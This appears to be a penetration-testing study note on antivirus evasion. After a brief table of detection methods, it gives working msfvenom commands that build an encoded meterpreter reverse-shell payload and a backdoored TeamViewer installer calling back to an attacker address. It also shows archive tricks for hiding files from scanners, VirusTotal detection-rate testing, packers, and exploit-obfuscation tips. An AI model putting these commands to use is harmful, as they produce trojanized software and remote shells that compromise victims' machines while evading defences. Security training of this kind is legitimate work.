## Security Policies Mechanisms

| Detection Type             | Description                            |
| -------------------------- | -------------------------------------- |
| Signature-based            | Matches known malware patterns         |
| Heuristic / Anomaly-based  | Detects deviation from normal behavior |
| Stateful Protocol Analysis | Analyzes protocol state/flows          |
| Live Monitoring (SOC)      | Human + automated real-time alerting   |
## Evasion with msfvenom: Key Techniques

###  Encoding Payload

- Use encoders like `x86/shikata_ga_nai`
- Use `-i <iterations>` for multiple layers of encoding

```bash
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<ip> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```
### Backdoored Executables

- Use existing legit EXE to inject payload using `-x`
- Use `-k` to preserve original functionality (run in parallel)

```bash
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows \
  -o TeamViewer_Backdoored.exe -i 5
```
### Password-Protected Archive Bypass

- AVs cannot scan password-protected `.rar` / `.zip` files
- Rename `.rar` to remove file extension to reduce detection   

```bash
rar a -p test.rar test.js
mv test.rar test
rar a -p test2.rar test
mv test2.rar test2
```

> Uploading `test2` (double archived and renamed) yields 0/49 detection in VirusTotal.

### Testing with VirusTotal CLI

```bash
msf-virustotal -k <API_KEY> -f payload.exe
```

Use after every obfuscation attempt to get detection rate.

## Packers

- Tools that compress + encrypt EXEs
- Hide shellcode from AV signatures

Popular Packers:

- `UPX`, `MPRESS`, `Enigma Protector`, `ExeStealth`, `Morphine`, `Themida`
## Exploit Coding Evasion Tips

- Avoid:
    - Obvious NOP sleds (`\x90\x90\x90`)
    - Repetitive buffer patterns
- Use random offsets in targets to obfuscate

```ruby
'Targets' => [
  [ 'Win2k SP4', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
]
```
# Tags
> #Pre-Exploitation #Shells #MSFVenom 